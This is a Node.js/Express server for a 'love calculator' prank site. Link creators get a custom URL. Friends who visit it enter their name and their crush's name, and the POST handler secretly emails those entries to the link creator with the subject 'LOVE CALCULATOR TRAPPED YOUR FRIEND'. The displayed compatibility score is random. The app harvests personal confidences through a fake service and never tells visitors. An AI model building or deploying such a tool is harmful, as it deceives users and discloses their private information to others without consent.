require('dotenv').config()
const express = require('express')
const mongoose = require('mongoose')
const ejs = require('ejs')

const db = require('./db')
const sendMail = require('./sendMail')
const User = require('./user.model')

const port = process.env.PORT || 5000
const app = express()

app.use(express.urlencoded({ extended: false }))
app.set('view engine', 'ejs')

app.get('/', (req, res) => {
    res.render('index', { message: null, error: null })
})

app.post('/', async (req, res) => {
    if (req.body.email) {
        const user = new User({
            email: req.body.email
        })
        try {
            const savedUser = await user.save()
            res.render('customUserLink', { user: savedUser._id })
        } catch (err) {
            if (err.errmsg.includes('E11000 duplicate key error')) {
                const foundUser = await User.findOne({ email: req.body.email })
                res.render('customUserLink', { user: foundUser._id })
            } else {
                res.status(500).send('Internal Server Error')
            }
        }
    } else {
        res.render('index', { message: 'Error', error: 'Email is Required' })
    }
})

app.get('/:id', async (req, res) => {
    try {
        const user = await User.findOne({
            _id: req.params.id
        })
        if (user) res.render('calculate', { uid: user._id })
        else res.status(404).send('Not Found')
    } catch (err) {
        if (err.message.includes('Cast to ObjectId failed for value')) res.status(404).send('Not Found')
        else res.status(500).send('Internal Server Error')
    }
})

app.post('/:id', async (req, res) => {
    if (!req.body.name || req.body.name == '') return res.status(400).send('Name is required')
    if (!req.body.crushname || req.body.crushname == '') return res.status(400).send('Crush Name is required')
    try {
        const user = await User.findOne({
            _id: req.params.id
        })
        if (user) {
            sendMail(user.email, 'LOVE CALCULATOR TRAPPED YOUR FRIEND', `Name: ${req.body.name} Crush: ${req.body.crushname}`)
            let value = Math.floor(Math.random() * 100)
            res.render('result', { name: req.body.name, crushname: req.body.crushname, value: value })
        }
        else res.status(404).send('Not Found')
    } catch (err) {
        if (err.message.includes('Cast to ObjectId failed for value')) res.status(404).send('Not Found')
        else res.status(500).send('Internal Server Error')
    }
})

app.listen(port, () => console.log(`Listening on Port ${port}...`))